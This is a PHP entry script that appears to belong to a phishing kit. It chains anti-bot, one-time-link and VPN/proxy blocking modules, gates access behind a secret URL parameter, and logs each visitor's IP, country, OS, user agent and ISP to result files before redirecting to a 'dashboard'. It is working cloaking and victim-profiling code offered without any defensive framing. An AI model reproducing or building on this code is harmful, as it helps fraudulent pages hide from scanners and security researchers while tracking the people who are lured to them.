<?php 
session_start();
require 'main.php';
require_once 'blocker.php';
include('detects.php');
include('blockers.php');
if(filesize("config/antibot.ini") == 1) {
}else{
require_once("antibot.php");
}
if($onetime == "on") {
	require_once 'onetime.php';
}
if($block_vpn == "on") {
    require_once 'proxyblock.php';
}
if($site_param_on == "on") {
    $secret = $site_parameter;
    $password = $_GET[$secret];
    if(!isset($password)) {
        tulis_file("result/total_bot.txt","<tr><td><p class=\"text-danger\">$ip|Wrong Site Parameter</p></td></tr>");
        //header("Location : /cgi-sys/defaultwebpage.cgi");
    
    }else{
        $_SESSION['key'] = $key;
    }
}
$_SESSION['key'] = $key;
header("location: dashboard?key=$key");
tulis_file("result/total_click.txt","<tr><td><p class=\"text-warning\">$v_ip|$countryname|$os|$v_agent|$ispuser</p></td></tr>");
?>